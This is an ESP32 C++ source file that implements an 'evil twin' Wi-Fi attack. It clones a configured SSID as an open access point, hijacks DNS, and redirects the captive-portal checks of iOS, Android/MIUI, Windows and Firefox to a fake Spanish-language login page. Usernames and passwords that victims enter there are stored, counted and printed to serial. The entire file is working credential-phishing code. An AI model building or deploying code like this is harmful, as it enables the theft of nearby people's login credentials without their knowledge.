#include "evil_twin.h"
#include "api_server.h"
#include "config.h"
#include "chain_controller.h"
#include "control_ap.h"
#include <WiFi.h>
#include <Arduino.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>

static DNSServer _dns;
static bool _handlers_registered = false;

static const char PORTAL_HTML[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Wi-Fi Login</title>"
    "<style>body{font-family:sans-serif;background:#f4f4f4;margin:0;padding:24px}"
    ".card{max-width:320px;margin:32px auto;padding:24px;background:#fff;"
    "border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1)}"
    "input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;"
    "border-radius:4px;font-size:14px;box-sizing:border-box}"
    "button{width:100%;padding:12px;background:#1976d2;color:#fff;border:0;"
    "border-radius:4px;font-size:14px}"
    "h1{font-size:18px;margin:0 0 16px}</style></head>"
    "<body><div class=\"card\"><h1>Conexion requerida</h1>"
    "<p style=\"font-size:13px;color:#555\">Ingrese sus credenciales para continuar.</p>"
    "<form method=\"POST\" action=\"/login\">"
    "<input name=\"usuario\" placeholder=\"Usuario\" required>"
    "<input name=\"password\" type=\"password\" placeholder=\"Contrasena\" required>"
    "<button>Conectar</button></form></div></body></html>";

static const char THANKS_HTML[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Conectando</title></head>"
    "<body style=\"font-family:sans-serif;text-align:center;padding:48px\">"
    "<h2>Conectando...</h2><p>Por favor espere.</p></body></html>";

static void _log_req(AsyncWebServerRequest* req, const char* tag) {
    Serial.printf("[FASE_3][%s] %s %s host=%s ip=%s\n",
                  tag,
                  req->methodToString(),
                  req->url().c_str(),
                  req->host().c_str(),
                  req->client()->remoteIP().toString().c_str());
}

void evil_twin_start() {
    control_ap_stop();
    delay(200);

    // 4.3.2.1: public-looking IP — Android/MIUI skips captive portal popup on RFC1918 addresses
    IPAddress ap_ip(4, 3, 2, 1);
    IPAddress subnet(255, 255, 255, 0);
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAPConfig(ap_ip, ap_ip, subnet);
    WiFi.softAP(g_config.ssid_clonar, NULL, g_config.canal);
    delay(200);
    WiFi.AP.enableDhcpCaptivePortal();

    bool dns_ok = _dns.start(53, "*", ap_ip);
    Serial.printf("[FASE_3] DNS: %s  AP IP: %s\n",
                  dns_ok ? "OK" : "FAILED",
                  WiFi.softAPIP().toString().c_str());

    // Reuse the already-running api_server (port 80 stays open — no bind race)
    AsyncWebServer& srv = api_server_get();

    if (!_handlers_registered) {
        srv.on("/login", HTTP_POST, [](AsyncWebServerRequest* req) {
            _log_req(req, "login");
            String usuario = req->hasParam("usuario", true) ? req->getParam("usuario", true)->value() : "?";
            String password = req->hasParam("password", true) ? req->getParam("password", true)->value() : "?";
            char client_ip[16] = "0.0.0.0";
            req->client()->remoteIP().toString().toCharArray(client_ip, sizeof(client_ip));
            cred_push(usuario.c_str(), password.c_str(), client_ip);
            g_chain_state.credenciales_capturadas++;
            Serial.printf("[FASE_3] CRED usuario=%s pass=%s ip=%s\n",
                          usuario.c_str(), password.c_str(), client_ip);
            req->send(200, "text/html", THANKS_HTML);
        });
        // iOS
        srv.on("/hotspot-detect.html", HTTP_ANY, [](AsyncWebServerRequest* req) {
            _log_req(req, "probe"); req->redirect("http://4.3.2.1/");
        });
        srv.on("/library/test/success.html", HTTP_ANY, [](AsyncWebServerRequest* req) {
            _log_req(req, "probe"); req->redirect("http://4.3.2.1/");
        });
        // Android / MIUI
        srv.on("/generate_204", HTTP_ANY, [](AsyncWebServerRequest* req) {
            _log_req(req, "probe"); req->redirect("http://4.3.2.1/");
        });
        srv.on("/gen_204", HTTP_ANY, [](AsyncWebServerRequest* req) {
            _log_req(req, "probe"); req->redirect("http://4.3.2.1/");
        });
        srv.on("/CheckConnection", HTTP_ANY, [](AsyncWebServerRequest* req) {
            _log_req(req, "miui"); req->redirect("http://4.3.2.1/");
        });
        // Windows 10/11
        srv.on("/connecttest.txt", HTTP_ANY, [](AsyncWebServerRequest* req) {
            _log_req(req, "probe"); req->redirect("http://logout.net");
        });
        srv.on("/ncsi.txt", HTTP_ANY, [](AsyncWebServerRequest* req) {
            _log_req(req, "probe"); req->redirect("http://4.3.2.1/");
        });
        srv.on("/redirect", HTTP_ANY, [](AsyncWebServerRequest* req) {
            _log_req(req, "probe"); req->redirect("http://4.3.2.1/");
        });
        // Firefox
        srv.on("/canonical.html", HTTP_ANY, [](AsyncWebServerRequest* req) {
            _log_req(req, "probe"); req->redirect("http://4.3.2.1/");
        });
        srv.on("/wpad.dat", HTTP_ANY, [](AsyncWebServerRequest* req) { req->send(404); });
        srv.on("/favicon.ico", HTTP_ANY, [](AsyncWebServerRequest* req) { req->send(404); });
        srv.on("/", HTTP_GET, [](AsyncWebServerRequest* req) {
            _log_req(req, "root");
            auto* resp = req->beginResponse(200, "text/html", PORTAL_HTML);
            req->send(resp);
        });
        _handlers_registered = true;
    }

    // Override catch-all to redirect to portal instead of returning 404 JSON
    srv.onNotFound([](AsyncWebServerRequest* req) {
        if (req->method() == HTTP_OPTIONS) {
            auto* resp = req->beginResponse(204);
            resp->addHeader("Access-Control-Allow-Origin", "*");
            req->send(resp);
            return;
        }
        _log_req(req, "404");
        req->redirect("http://4.3.2.1/");
    });

    Serial.printf("[INFO] [%lu] Evil Twin AP started: SSID=%s ch=%d IP=%s\n",
                  millis(), g_config.ssid_clonar, g_config.canal,
                  WiFi.softAPIP().toString().c_str());
}

void evil_twin_stop() {
    _dns.stop();
    WiFi.softAPdisconnect(true);
    delay(200);

    Serial.printf("[FASE_3] done clientes=%d creds=%d\n",
                  (int)g_chain_state.clientes_evil_twin,
                  (int)g_chain_state.credenciales_capturadas);

    // Restore api_server 404 handler
    api_server_get().onNotFound([](AsyncWebServerRequest* req) {
        if (req->method() == HTTP_OPTIONS) {
            auto* resp = req->beginResponse(204);
            resp->addHeader("Access-Control-Allow-Origin", "*");
            req->send(resp);
            return;
        }
        req->send(404, "application/json",
            "{\"ok\":false,\"error\":\"not found\",\"codigo\":\"NOT_FOUND\"}");
    });

    control_ap_start();
}
